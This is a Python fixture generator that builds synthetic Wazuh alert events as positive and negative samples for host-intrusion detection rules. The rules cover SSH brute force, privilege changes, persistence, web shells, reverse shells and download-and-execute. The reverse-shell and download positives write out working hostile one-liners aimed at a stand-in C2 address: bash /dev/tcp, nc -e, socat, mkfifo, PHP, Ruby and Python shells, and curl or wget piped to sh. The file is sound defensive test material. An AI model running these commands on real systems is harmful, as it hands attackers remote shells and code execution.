from __future__ import annotations

import json
import random
from collections.abc import Callable, Iterable
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from detectionlab.eventos import Evento

SEMILLA = 20261118
ARCHIVO_POSITIVOS = "positivos.jsonl"
ARCHIVO_NEGATIVOS = "negativos.jsonl"

_ZONA = timezone(timedelta(hours=-3))
_BASE = datetime(2026, 11, 10, 8, 0, 0, tzinfo=_ZONA)
_AGENTES = (
    ("001", "web-01", "10.0.10.21"),
    ("002", "db-01", "10.0.10.32"),
    ("003", "bastion-01", "10.0.1.5"),
)
_USUARIOS_INVALIDOS = ("admin", "test", "oracle", "ubuntu", "pi", "git", "deploy", "ftp")
_EXTERNA_ATACANTE = "203.0.113.45"
_EXTERNA_ATACANTE_2 = "198.51.100.7"
_EXTERNA_C2 = "203.0.113.9"


@dataclass(frozen=True)
class Escenario:
    regla: str
    positivos: Callable[[Fabrica], list[Evento]]
    negativos: Callable[[Fabrica], list[Evento]]


class Fabrica:
    """Construye eventos con la forma de las alertas JSON de Wazuh."""

    def __init__(self, semilla: int, inicio: datetime) -> None:
        self.rng = random.Random(semilla)
        self.inicio = inicio
        self._secuencia = 0

    def _siguiente_id(self) -> str:
        self._secuencia += 1
        return f"{int(self.inicio.timestamp())}.{self._secuencia:06d}"

    def instante(self, segundos: float) -> datetime:
        return self.inicio + timedelta(seconds=segundos)

    def agente(self, indice: int = 0) -> dict[str, str]:
        identificador, nombre, ip = _AGENTES[indice % len(_AGENTES)]
        return {"id": identificador, "name": nombre, "ip": ip}

    def _alerta(
        self,
        cuando: datetime,
        agente: dict[str, str],
        regla: dict[str, Any],
        decoder: str,
        data: dict[str, Any],
        full_log: str,
        location: str,
        programa: str | None = None,
    ) -> Evento:
        evento: Evento = {
            "timestamp": cuando.strftime("%Y-%m-%dT%H:%M:%S.")
            + f"{cuando.microsecond // 1000:03d}"
            + cuando.strftime("%z"),
            "rule": {"firedtimes": 1, "mail": False, **regla},
            "agent": agente,
            "manager": {"name": "wazuh-manager"},
            "id": self._siguiente_id(),
            "full_log": full_log,
            "decoder": {"name": decoder},
            "data": data,
            "location": location,
        }
        if programa is not None:
            evento["predecoder"] = {
                "program_name": programa,
                "timestamp": cuando.strftime("%b %d %H:%M:%S"),
                "hostname": agente["name"],
            }
        return evento

    def sshd_fallo(
        self,
        segundos: float,
        ip: str,
        usuario: str,
        agente: int = 2,
        invalido: bool = False,
        clave_publica: bool = False,
    ) -> Evento:
        cuando = self.instante(segundos)
        puerto = self.rng.randint(1024, 65535)
        if invalido:
            log = f"Invalid user {usuario} from {ip} port {puerto}"
            regla = {
                "level": 5,
                "id": "5710",
                "description": "sshd: Attempt to login using a non-existent user",
                "groups": ["syslog", "sshd", "invalid_login", "authentication_failed"],
                "mitre": {"id": ["T1110.001", "T1021.004"]},
            }
            data = {"srcip": ip, "srcport": str(puerto), "srcuser": usuario}
        elif clave_publica:
            log = f"Failed publickey for {usuario} from {ip} port {puerto} ssh2: RSA SHA256:3fQ"
            regla = {
                "level": 5,
                "id": "5760",
                "description": "sshd: authentication failed.",
                "groups": ["syslog", "sshd", "authentication_failed"],
                "mitre": {"id": ["T1110.001", "T1021.004"]},
            }
            data = {"srcip": ip, "srcport": str(puerto), "dstuser": usuario}
        else:
            log = f"Failed password for {usuario} from {ip} port {puerto} ssh2"
            regla = {
                "level": 5,
                "id": "5716",
                "description": "sshd: authentication failed.",
                "groups": ["syslog", "sshd", "authentication_failed"],
                "mitre": {"id": ["T1110.001", "T1021.004"]},
            }
            data = {"srcip": ip, "srcport": str(puerto), "dstuser": usuario}
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "sshd",
            data,
            self._syslog(cuando, agente, "sshd", log),
            "/var/log/auth.log",
            programa="sshd",
        )

    def sshd_exito(self, segundos: float, ip: str, usuario: str, agente: int = 2) -> Evento:
        cuando = self.instante(segundos)
        puerto = self.rng.randint(1024, 65535)
        metodo = self.rng.choice(("password", "publickey"))
        log = f"Accepted {metodo} for {usuario} from {ip} port {puerto} ssh2"
        regla = {
            "level": 3,
            "id": "5715",
            "description": "sshd: authentication success.",
            "groups": ["syslog", "sshd", "authentication_success"],
        }
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "sshd",
            {"srcip": ip, "srcport": str(puerto), "dstuser": usuario},
            self._syslog(cuando, agente, "sshd", log),
            "/var/log/auth.log",
            programa="sshd",
        )

    def sshd_desconexion(self, segundos: float, ip: str, agente: int = 2) -> Evento:
        cuando = self.instante(segundos)
        puerto = self.rng.randint(1024, 65535)
        log = f"Received disconnect from {ip} port {puerto}:11: disconnected by user"
        regla = {
            "level": 0,
            "id": "5721",
            "description": "sshd: System disconnected from sshd.",
            "groups": ["syslog", "sshd"],
        }
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "sshd",
            {"srcip": ip, "srcport": str(puerto)},
            self._syslog(cuando, agente, "sshd", log),
            "/var/log/auth.log",
            programa="sshd",
        )

    def sudo(
        self,
        segundos: float,
        usuario: str,
        comando: str,
        destino: str = "root",
        agente: int = 0,
        tty: str = "pts/0",
        pwd: str = "/home/dani",
        rechazo: str | None = None,
    ) -> Evento:
        cuando = self.instante(segundos)
        if rechazo is None:
            log = f"{usuario} : TTY={tty} ; PWD={pwd} ; USER={destino} ; COMMAND={comando}"
            regla = {
                "level": 3,
                "id": "5402" if destino == "root" else "5407",
                "description": "Successful sudo to ROOT executed."
                if destino == "root"
                else "Successful sudo executed.",
                "groups": ["syslog", "sudo"],
            }
        else:
            log = (
                f"{usuario} : {rechazo} ; TTY={tty} ; PWD={pwd} ; USER={destino} ; "
                f"COMMAND={comando}"
            )
            regla = {
                "level": 5,
                "id": "5405" if "sudoers" in rechazo else "5401",
                "description": "Failed attempt to run sudo.",
                "groups": ["syslog", "sudo"],
            }
        data = {
            "srcuser": usuario,
            "tty": tty,
            "pwd": pwd,
            "dstuser": destino,
            "command": comando,
        }
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "sudo",
            data,
            self._syslog(cuando, agente, "sudo", log),
            "/var/log/auth.log",
            programa="sudo",
        )

    def su(
        self, segundos: float, origen: str, destino: str, exito: bool, agente: int = 0
    ) -> Evento:
        cuando = self.instante(segundos)
        if exito:
            log = f"(to {destino}) {origen} on pts/1"
            regla = {
                "level": 3,
                "id": "5303",
                "description": "User successfully changed UID.",
                "groups": ["syslog", "su", "authentication_success"],
            }
        else:
            log = f"FAILED su for {destino} by {origen}"
            regla = {
                "level": 5,
                "id": "5301",
                "description": "User missed the password to change UID (user id).",
                "groups": ["syslog", "su", "authentication_failed"],
            }
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "su",
            {"srcuser": origen, "dstuser": destino},
            self._syslog(cuando, agente, "su", log),
            "/var/log/auth.log",
            programa="su",
        )

    def auditd_ejecucion(
        self,
        segundos: float,
        exe: str,
        argumentos: list[str],
        uid: str = "1000",
        auid: str = "1000",
        cwd: str = "/home/dani",
        agente: int = 0,
        tty: str = "pts0",
        clave: str = "exec",
    ) -> Evento:
        cuando = self.instante(segundos)
        pid = self.rng.randint(2000, 60000)
        ppid = self.rng.randint(1000, 1999)
        epoca = f"{cuando.timestamp():.3f}:{self.rng.randint(1000, 99999)}"
        comm = Path(exe).name[:15]
        codificados = [_codificar_argumento(arg) for arg in argumentos]
        registro_execve = " ".join(f"a{i}={valor}" for i, valor in enumerate(codificados))
        full_log = (
            f"type=SYSCALL msg=audit({epoca}): arch=c000003e syscall=59 success=yes exit=0 "
            f"a0=55d1 a1=55d2 a2=55d3 a3=8 items=2 ppid={ppid} pid={pid} auid={auid} uid={uid} "
            f"gid={uid} euid={uid} suid={uid} fsuid={uid} egid={uid} sgid={uid} fsgid={uid} "
            f'tty={tty} ses=4 comm="{comm}" exe="{exe}" key="{clave}"\n'
            f"type=EXECVE msg=audit({epoca}): argc={len(argumentos)} {registro_execve}\n"
            f'type=CWD msg=audit({epoca}): cwd="{cwd}"\n'
            f'type=PATH msg=audit({epoca}): item=0 name="{exe}" inode=393 mode=0100755 '
            f"ouid=0 ogid=0"
        )
        execve = {f"a{i}": _sin_comillas(valor) for i, valor in enumerate(codificados)}
        data = {
            "audit": {
                "type": "SYSCALL",
                "id": epoca.split(":")[1],
                "arch": "c000003e",
                "syscall": "59",
                "success": "yes",
                "exit": "0",
                "ppid": str(ppid),
                "pid": str(pid),
                "auid": auid,
                "uid": uid,
                "gid": uid,
                "euid": uid,
                "tty": tty,
                "session": "4",
                "command": comm,
                "exe": exe,
                "key": clave,
                "cwd": cwd,
                "execve": execve,
                "file": {"name": exe, "inode": "393", "mode": "0100755"},
            }
        }
        regla = {
            "level": 3,
            "id": "80792",
            "description": f"Audit: Command: {exe}.",
            "groups": ["audit", "audit_command"],
        }
        return self._alerta(
            cuando, self.agente(agente), regla, "auditd", data, full_log, "/var/log/audit/audit.log"
        )

    def ejecucion_web(
        self, segundos: float, exe: str, argumentos: list[str], uid: str = "33"
    ) -> Evento:
        """Proceso lanzado por la cuenta del servidor web: sin sesión ni terminal."""
        return self.auditd_ejecucion(
            segundos, exe, argumentos, uid=uid, auid="4294967295", cwd="/var/www/html", tty="(none)"
        )

    def auditd_archivo(
        self,
        segundos: float,
        exe: str,
        archivo: str,
        clave: str,
        uid: str = "0",
        auid: str = "1000",
        exito: bool = True,
        agente: int = 0,
        cwd: str = "/root",
    ) -> Evento:
        cuando = self.instante(segundos)
        pid = self.rng.randint(2000, 60000)
        ppid = self.rng.randint(1000, 1999)
        epoca = f"{cuando.timestamp():.3f}:{self.rng.randint(1000, 99999)}"
        comm = Path(exe).name[:15]
        resultado = "yes" if exito else "no"
        salida = "3" if exito else "-13"
        full_log = (
            f"type=SYSCALL msg=audit({epoca}): arch=c000003e syscall=257 success={resultado} "
            f"exit={salida} a0=ffffff9c a1=55d2 a2=241 a3=1b6 items=2 ppid={ppid} pid={pid} "
            f"auid={auid} uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} egid={uid} "
            f'sgid={uid} fsgid={uid} tty=pts0 ses=4 comm="{comm}" exe="{exe}" key="{clave}"\n'
            f'type=CWD msg=audit({epoca}): cwd="{cwd}"\n'
            f'type=PATH msg=audit({epoca}): item=1 name="{archivo}" inode=1180 mode=0100644 '
            f"ouid=0 ogid=0"
        )
        data = {
            "audit": {
                "type": "SYSCALL",
                "id": epoca.split(":")[1],
                "arch": "c000003e",
                "syscall": "257",
                "success": resultado,
                "exit": salida,
                "ppid": str(ppid),
                "pid": str(pid),
                "auid": auid,
                "uid": uid,
                "gid": uid,
                "euid": uid,
                "tty": "pts0",
                "session": "4",
                "command": comm,
                "exe": exe,
                "key": clave,
                "cwd": cwd,
                "file": {"name": archivo, "inode": "1180", "mode": "0100644"},
            }
        }
        regla = {
            "level": 3,
            "id": "80784",
            "description": f"Audit: Watch - Write access: {archivo}.",
            "groups": ["audit", "audit_watch_write"],
        }
        return self._alerta(
            cuando, self.agente(agente), regla, "auditd", data, full_log, "/var/log/audit/audit.log"
        )

    def suricata_dns(
        self,
        segundos: float,
        src_ip: str,
        rrname: str,
        rrtype: str = "A",
        tipo: str = "query",
        agente: int = 0,
    ) -> Evento:
        cuando = self.instante(segundos)
        data: dict[str, Any] = {
            "timestamp": cuando.isoformat(timespec="microseconds"),
            "flow_id": str(self.rng.randint(10**15, 10**16)),
            "in_iface": "eth0",
            "event_type": "dns",
            "src_ip": src_ip,
            "src_port": self.rng.randint(1024, 65535),
            "dest_ip": "10.0.0.53",
            "dest_port": 53,
            "proto": "UDP",
            "dns": {
                "type": tipo,
                "id": str(self.rng.randint(1, 65535)),
                "rrname": rrname,
                "rrtype": rrtype,
                "tx_id": "0",
            },
        }
        if tipo == "answer":
            data["dns"]["rcode"] = "NOERROR"
        regla = {
            "level": 0,
            "id": "86603",
            "description": "Suricata: DNS.",
            "groups": ["ids", "suricata"],
        }
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "json",
            data,
            json.dumps(data, separators=(",", ":")),
            "/var/log/suricata/eve.json",
        )

    def suricata_flow(
        self,
        segundos: float,
        src_ip: str,
        dest_ip: str,
        dest_port: int,
        pkts_toclient: int = 0,
        proto: str = "TCP",
        agente: int = 0,
    ) -> Evento:
        cuando = self.instante(segundos)
        fin = cuando + timedelta(seconds=self.rng.uniform(0.5, 3.0))
        data: dict[str, Any] = {
            "timestamp": fin.isoformat(timespec="microseconds"),
            "flow_id": str(self.rng.randint(10**15, 10**16)),
            "in_iface": "eth0",
            "event_type": "flow",
            "src_ip": src_ip,
            "src_port": self.rng.randint(1024, 65535),
            "dest_ip": dest_ip,
            "dest_port": dest_port,
            "proto": proto,
            "flow": {
                "pkts_toserver": 1 if pkts_toclient == 0 else self.rng.randint(3, 20),
                "pkts_toclient": pkts_toclient,
                "bytes_toserver": 74 if pkts_toclient == 0 else self.rng.randint(300, 4000),
                "bytes_toclient": 0 if pkts_toclient == 0 else self.rng.randint(300, 9000),
                "start": cuando.isoformat(timespec="microseconds"),
                "end": fin.isoformat(timespec="microseconds"),
                "age": 0,
                "state": "new" if pkts_toclient == 0 else "closed",
                "reason": "timeout",
                "alerted": False,
            },
        }
        if proto == "TCP" and pkts_toclient == 0:
            data["tcp"] = {
                "tcp_flags": "02",
                "tcp_flags_ts": "02",
                "tcp_flags_tc": "00",
                "syn": True,
            }
        regla = {
            "level": 0,
            "id": "86600",
            "description": "Suricata messages.",
            "groups": ["ids", "suricata"],
        }
        return self._alerta(
            cuando,
            self.agente(agente),
            regla,
            "json",
            data,
            json.dumps(data, separators=(",", ":")),
            "/var/log/suricata/eve.json",
        )

    def _syslog(self, cuando: datetime, agente: int, programa: str, mensaje: str) -> str:
        nombre = self.agente(agente)["name"]
        pid = self.rng.randint(500, 60000)
        return f"{cuando.strftime('%b %d %H:%M:%S')} {nombre} {programa}[{pid}]: {mensaje}"


def _codificar_argumento(valor: str) -> str:
    if valor == "":
        return '""'
    if any(caracter in valor for caracter in " \"'\t\n") or not valor.isprintable():
        return valor.encode("utf-8").hex().upper()
    return f'"{valor}"'


def _sin_comillas(valor: str) -> str:
    if len(valor) >= 2 and valor[0] == '"' and valor[-1] == '"':
        return valor[1:-1]
    return valor


def _ssh_fallo_pos(f: Fabrica) -> list[Evento]:
    return [
        f.sshd_fallo(0, _EXTERNA_ATACANTE, "admin", invalido=True),
        f.sshd_fallo(40, "198.51.100.23", "dani"),
        f.sshd_fallo(95, "192.0.2.77", "deploy", clave_publica=True),
    ]


def _ssh_fallo_neg(f: Fabrica) -> list[Evento]:
    return [
        f.sshd_exito(0, "10.0.1.50", "dani"),
        f.sshd_fallo(30, "127.0.0.1", "root"),
        f.sshd_desconexion(60, "10.0.1.50"),
        f.sudo(90, "dani", "/usr/bin/apt update"),
    ]


def _ssh_exito_pos(f: Fabrica) -> list[Evento]:
    return [f.sshd_exito(0, "10.0.1.50", "dani"), f.sshd_exito(120, "10.0.1.51", "deploy")]


def _ssh_exito_neg(f: Fabrica) -> list[Evento]:
    return [
        f.sshd_fallo(0, "10.0.1.50", "dani"),
        f.sshd_desconexion(5, "10.0.1.50"),
        f.sshd_fallo(10, _EXTERNA_ATACANTE, "admin", invalido=True),
    ]


def _fuerza_bruta_pos(f: Fabrica) -> list[Evento]:
    eventos = []
    for i in range(25):
        usuario = f.rng.choice(_USUARIOS_INVALIDOS)
        eventos.append(f.sshd_fallo(i * 3.5, _EXTERNA_ATACANTE, usuario, invalido=i % 3 == 0))
    for i in range(10):
        eventos.append(f.sshd_fallo(600 + i * 6, _EXTERNA_ATACANTE_2, "root"))
    return eventos


def _fuerza_bruta_neg(f: Fabrica) -> list[Evento]:
    eventos = [f.sshd_fallo(i * 15, "10.0.1.50", "dani") for i in range(6)]
    eventos += [f.sshd_fallo(900 + i * 200, "10.0.1.51", "deploy") for i in range(12)]
    eventos += [
        f.sshd_fallo(4000 + i * 2, f"198.51.100.{100 + i}", "admin", invalido=True)
        for i in range(15)
    ]
    return eventos


def _tras_rafaga_pos(f: Fabrica) -> list[Evento]:
    eventos = [f.sshd_fallo(i * 4, _EXTERNA_ATACANTE, "dani") for i in range(15)]
    eventos.append(f.sshd_exito(15 * 4 + 180, _EXTERNA_ATACANTE, "dani"))
    return eventos


def _tras_rafaga_neg(f: Fabrica) -> list[Evento]:
    eventos = [f.sshd_fallo(i * 4, _EXTERNA_ATACANTE, "dani") for i in range(15)]
    eventos.append(f.sshd_exito(100, "10.0.1.50", "dani"))
    eventos.append(f.sshd_exito(60 + 30 * 60, _EXTERNA_ATACANTE, "dani"))
    eventos.append(f.sshd_exito(7200, _EXTERNA_ATACANTE_2, "deploy"))
    eventos += [f.sshd_fallo(7210 + i * 4, _EXTERNA_ATACANTE_2, "deploy") for i in range(15)]
    return eventos


def _cuentas_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_ejecucion(
            0, "/usr/sbin/useradd", ["useradd", "-m", "-s", "/bin/bash", "backup2"], uid="0"
        ),
        f.auditd_ejecucion(20, "/usr/sbin/usermod", ["usermod", "-aG", "sudo", "backup2"], uid="0"),
        f.auditd_archivo(45, "/usr/bin/bash", "/etc/sudoers.d/backup2", "sudoers"),
        f.auditd_ejecucion(70, "/usr/bin/gpasswd", ["gpasswd", "-a", "eve", "wheel"], uid="0"),
        f.auditd_ejecucion(
            95,
            "/usr/bin/perl",
            ["/usr/bin/perl", "/usr/sbin/adduser", "eve", "sudo"],
            uid="0",
            auid="4294967295",
        ),
    ]


def _cuentas_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_ejecucion(
            0,
            "/usr/sbin/useradd",
            ["useradd", "--system", "--no-create-home", "--shell", "/usr/sbin/nologin", "_nginx"],
            uid="0",
            auid="4294967295",
        ),
        f.auditd_archivo(10, "/usr/sbin/visudo", "/etc/sudoers.tmp", "sudoers"),
        f.auditd_ejecucion(30, "/usr/sbin/usermod", ["usermod", "-aG", "docker", "dani"], uid="0"),
        f.auditd_ejecucion(
            50,
            "/usr/sbin/useradd",
            ["useradd", "-r", "-s", "/usr/sbin/nologin", "redis"],
            uid="0",
            auid="4294967295",
        ),
        f.auditd_archivo(
            70, "/usr/bin/dpkg", "/etc/sudoers.d/90-cloud-init-users", "sudoers", auid="4294967295"
        ),
        f.auditd_ejecucion(90, "/usr/bin/passwd", ["passwd", "dani"], uid="1000"),
        f.auditd_ejecucion(110, "/usr/bin/sudo", ["sudo", "usermod", "-aG", "docker", "dani"]),
        f.auditd_ejecucion(
            130, "/usr/sbin/usermod", ["usermod", "-c", "Administrador de red", "bob"], uid="0"
        ),
    ]


def _sudo_pos(f: Fabrica) -> list[Evento]:
    return [
        f.sudo(0, "jsmith", "/bin/bash"),
        f.sudo(30, "jsmith", "/usr/bin/su -"),
        f.sudo(60, "www-data", "/bin/sh", rechazo="user NOT in sudoers", pwd="/var/www/html"),
        f.sudo(90, "jsmith", "/usr/bin/vim /etc/shadow", rechazo="3 incorrect password attempts"),
        f.su(120, "www-data", "root", exito=False),
        f.su(150, "postgres", "root", exito=True, agente=1),
        f.sudo(180, "dani", "/usr/bin/id", rechazo="command not allowed", destino="postgres"),
    ]


def _sudo_neg(f: Fabrica) -> list[Evento]:
    return [
        f.sudo(0, "dani", "/usr/bin/apt update"),
        f.sudo(20, "dani", "/usr/bin/systemctl restart nginx"),
        f.sudo(40, "svc-backup", "/bin/sh /opt/backup/run.sh", tty="unknown", pwd="/opt/backup"),
        f.su(60, "dani", "root", exito=True),
        f.sudo(80, "dani", "/usr/bin/ssh deploy@db-01"),
        f.sudo(100, "dani", "/usr/local/bin/bashful --version"),
        f.sudo(120, "dani", "/usr/bin/tail -f /var/log/nginx/error.log", destino="www-data"),
    ]


def _passwd_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(0, "/usr/bin/vim.basic", "/etc/shadow", "identidad"),
        f.auditd_archivo(30, "/usr/bin/bash", "/etc/passwd", "identidad", uid="33", cwd="/var/www"),
        f.auditd_archivo(60, "/usr/bin/sed", "/etc/passwd", "identidad"),
        f.auditd_archivo(90, "/usr/bin/python3", "/etc/shadow", "identidad", auid="4294967295"),
        f.auditd_archivo(120, "/usr/bin/nano", "/etc/group", "identidad"),
        f.auditd_archivo(150, "/usr/bin/cat", "/etc/shadow", "identidad", uid="33", cwd="/var/www"),
        f.auditd_archivo(180, "/usr/bin/python3.12", "/etc/gshadow", "identidad", uid="1000"),
        f.auditd_archivo(
            210, "/usr/bin/cat", "/etc/shadow", "identidad", uid="33", exito=False, cwd="/var/www"
        ),
    ]


def _passwd_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(0, "/usr/bin/passwd", "/etc/shadow", "identidad", uid="1000"),
        f.auditd_archivo(20, "/usr/sbin/useradd", "/etc/passwd", "identidad"),
        f.auditd_archivo(40, "/usr/bin/chage", "/etc/shadow", "identidad"),
        f.auditd_archivo(
            60, "/usr/bin/vim.basic", "/etc/group", "identidad", uid="1000", exito=False
        ),
        f.auditd_archivo(80, "/usr/sbin/groupadd", "/etc/gshadow", "identidad"),
        f.auditd_archivo(100, "/usr/bin/cp", "/etc/pam.d/passwd", "pam"),
        f.auditd_archivo(120, "/usr/sbin/vipw", "/etc/passwd", "identidad"),
        f.auditd_archivo(
            140, "/usr/lib/openssh/sshd-session", "/etc/shadow", "identidad", auid="4294967295"
        ),
        f.auditd_archivo(160, "/usr/sbin/unix_chkpwd", "/etc/shadow", "identidad", uid="1000"),
        f.auditd_archivo(180, "/usr/bin/sudo", "/etc/shadow", "identidad", uid="1000"),
    ]


def _cron_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(0, "/usr/bin/bash", "/etc/cron.d/update", "cron"),
        f.auditd_archivo(
            30,
            "/usr/bin/crontab",
            "/var/spool/cron/crontabs/www-data",
            "cron",
            uid="33",
            cwd="/var/www",
        ),
        f.auditd_archivo(60, "/usr/bin/vim.basic", "/etc/crontab", "cron"),
        f.auditd_archivo(90, "/usr/bin/cp", "/etc/cron.hourly/.sync", "cron"),
    ]


def _cron_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(0, "/usr/bin/dpkg", "/etc/cron.d/certbot", "cron", auid="4294967295"),
        f.auditd_archivo(20, "/usr/bin/apt-get", "/etc/cron.daily/apt-compat", "cron"),
        f.auditd_archivo(40, "/usr/bin/vim.basic", "/etc/cron.allow", "cron"),
        f.auditd_archivo(60, "/usr/bin/bash", "/etc/crontab", "cron", uid="33", exito=False),
        f.auditd_archivo(80, "/usr/sbin/rsyslogd", "/var/log/cron.log", "logs"),
    ]


def _systemd_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(
            0, "/usr/bin/bash", "/etc/systemd/system/update-checker.service", "systemd"
        ),
        f.auditd_archivo(30, "/usr/bin/cp", "/usr/lib/systemd/system/.cache.timer", "systemd"),
        f.auditd_archivo(
            60,
            "/usr/bin/tee",
            "/home/dani/.config/systemd/user/sync.service",
            "systemd",
            uid="1000",
            cwd="/home/dani",
        ),
        f.auditd_archivo(90, "/usr/bin/python3", "/run/systemd/system/kworker.service", "systemd"),
    ]


def _systemd_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(
            0, "/usr/bin/dpkg", "/lib/systemd/system/nginx.service", "systemd", auid="4294967295"
        ),
        f.auditd_archivo(
            20,
            "/usr/bin/systemctl",
            "/etc/systemd/system/multi-user.target.wants/nginx.service",
            "systemd",
        ),
        f.auditd_archivo(40, "/usr/bin/vim.basic", "/etc/systemd/journald.conf", "systemd"),
        f.auditd_archivo(
            60,
            "/usr/bin/snapd",
            "/etc/systemd/system/snap-core-1.mount",
            "systemd",
            auid="4294967295",
        ),
        f.auditd_archivo(
            80,
            "/usr/bin/bash",
            "/etc/systemd/system/app.service",
            "systemd",
            exito=False,
            uid="1000",
        ),
    ]


def _webshell_pos(f: Fabrica) -> list[Evento]:
    return [
        f.ejecucion_web(0, "/usr/bin/dash", ["sh", "-c", "id"]),
        f.ejecucion_web(5, "/usr/bin/id", ["id"]),
        f.auditd_ejecucion(
            30,
            "/usr/bin/python3.12",
            ["python3", "-c", "import os; os.system('uname -a')"],
            uid="48",
            auid="4294967295",
            cwd="/var/www/html",
            tty="(none)",
        ),
        f.auditd_ejecucion(
            60,
            "/usr/bin/curl",
            ["curl", "-s", f"http://{_EXTERNA_C2}/beacon"],
            uid="www-data",
            auid="4294967295",
            cwd="/var/www/html",
            tty="(none)",
        ),
        f.ejecucion_web(75, "/usr/bin/nc.openbsd", ["nc", "-zv", "10.0.10.32", "5432"]),
        f.auditd_ejecucion(
            90, "/usr/bin/whoami", ["whoami"], uid="nginx", auid="4294967295", cwd="/", tty="(none)"
        ),
    ]


def _webshell_neg(f: Fabrica) -> list[Evento]:
    return [
        f.ejecucion_web(0, "/usr/bin/php", ["php", "/var/www/html/artisan", "queue:work"]),
        f.auditd_ejecucion(20, "/usr/bin/bash", ["bash", "-c", "id"], uid="1000", auid="1000"),
        f.auditd_ejecucion(40, "/usr/sbin/nginx", ["nginx", "-s", "reload"], uid="0", auid="1000"),
        f.ejecucion_web(
            60, "/usr/bin/convert", ["convert", "upload.png", "-resize", "50%", "thumb.png"]
        ),
        f.auditd_ejecucion(80, "/usr/bin/id", ["id", "-u"], uid="0", auid="1000"),
    ]


def _reverse_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_ejecucion(
            0,
            "/usr/bin/bash",
            ["bash", "-c", f"bash -i >& /dev/tcp/{_EXTERNA_C2}/4444 0>&1"],
        ),
        f.ejecucion_web(
            30, "/usr/bin/nc.traditional", ["nc", "-e", "/bin/sh", _EXTERNA_C2, "4444"]
        ),
        f.auditd_ejecucion(
            60, "/usr/bin/ncat", ["ncat", "--exec", "/bin/bash", _EXTERNA_C2, "4444"]
        ),
        f.auditd_ejecucion(
            90,
            "/usr/bin/socat",
            ["socat", f"tcp:{_EXTERNA_C2}:4444", "exec:bash -li,pty,stderr,setsid"],
        ),
        f.auditd_ejecucion(
            120,
            "/usr/bin/dash",
            [
                "sh",
                "-c",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {_EXTERNA_C2} 4444 >/tmp/f",
            ],
        ),
        f.ejecucion_web(140, "/usr/bin/nc.openbsd", ["nc", "-e/bin/sh", _EXTERNA_C2, "4444"]),
        f.ejecucion_web(
            145,
            "/usr/bin/php8.3",
            [
                "php",
                "-r",
                f'$sock=fsockopen("{_EXTERNA_C2}",4444);exec("/bin/sh -i <&3 >&3 2>&3");',
            ],
        ),
        f.auditd_ejecucion(
            148,
            "/usr/bin/ruby3.1",
            [
                "ruby",
                "-rsocket",
                "-e",
                f'c=TCPSocket.new("{_EXTERNA_C2}","4444");while(cmd=c.gets);'
                'IO.popen(cmd,"r"){|io|c.print io.read}end',
            ],
        ),
        f.auditd_ejecucion(
            150,
            "/usr/bin/python3",
            [
                "python3",
                "-c",
                "import socket,os,pty;s=socket.socket();s.connect(('"
                + _EXTERNA_C2
                + "',4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn('/bin/sh')",
            ],
        ),
    ]


def _reverse_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_ejecucion(0, "/usr/bin/nc.openbsd", ["nc", "-zv", "10.0.10.32", "5432"]),
        f.auditd_ejecucion(20, "/usr/bin/curl", ["curl", "-s", "http://10.0.10.21/healthz"]),
        f.auditd_ejecucion(
            40, "/usr/bin/python3", ["python3", "-c", "import socket; print(socket.gethostname())"]
        ),
        f.auditd_ejecucion(60, "/usr/bin/socat", ["socat", "-", "TCP:10.0.10.32:5432"]),
        f.auditd_ejecucion(80, "/usr/bin/bash", ["bash", "-c", "cat /proc/net/tcp | wc -l"]),
        f.auditd_ejecucion(100, "/usr/bin/mkfifo", ["mkfifo", "/tmp/pipe"]),
        f.auditd_ejecucion(120, "/usr/bin/nc.openbsd", ["nc", "-l", "-p", "8080"]),
        f.auditd_ejecucion(
            140,
            "/usr/bin/php8.3",
            ["php", "-r", '$c=fsockopen("10.0.10.32",5432,$e,$s,2);echo $c?"ok":"no";'],
        ),
        f.auditd_ejecucion(
            160,
            "/usr/bin/ruby3.1",
            ["ruby", "-rsocket", "-e", 'puts TCPSocket.new("10.0.10.32",5432).peeraddr.inspect'],
        ),
    ]


def _descarga_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_ejecucion(
            0, "/usr/bin/bash", ["bash", "-c", f"curl -fsSL http://{_EXTERNA_C2}/x.sh | sh"]
        ),
        f.auditd_ejecucion(
            30, "/usr/bin/dash", ["sh", "-c", f"wget -qO- http://{_EXTERNA_C2}/i | bash"]
        ),
        f.auditd_ejecucion(
            60, "/usr/bin/bash", ["bash", "-c", f'bash -c "$(curl -s http://{_EXTERNA_C2}/s)"']
        ),
        f.auditd_ejecucion(
            90,
            "/usr/bin/dash",
            ["sh", "-c", f"curl -o /tmp/.x http://{_EXTERNA_C2}/x && chmod +x /tmp/.x && /tmp/.x"],
            uid="33",
            auid="4294967295",
            cwd="/var/www/html",
        ),
        f.auditd_ejecucion(
            120,
            "/usr/bin/bash",
            ["bash", "-c", f"wget http://{_EXTERNA_C2}/a -O /dev/shm/a; chmod 755 /dev/shm/a"],
        ),
        f.auditd_ejecucion(
            150, "/usr/bin/bash", ["bash", "-c", f"curl http://{_EXTERNA_C2}/r | sudo bash"]
        ),
    ]


def _descarga_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_ejecucion(
            0,
            "/usr/bin/bash",
            ["bash", "-c", "curl -fsSL https://deb.nodesource.com/setup_22.x | tee /tmp/setup.sh"],
        ),
        f.auditd_ejecucion(
            20,
            "/usr/bin/curl",
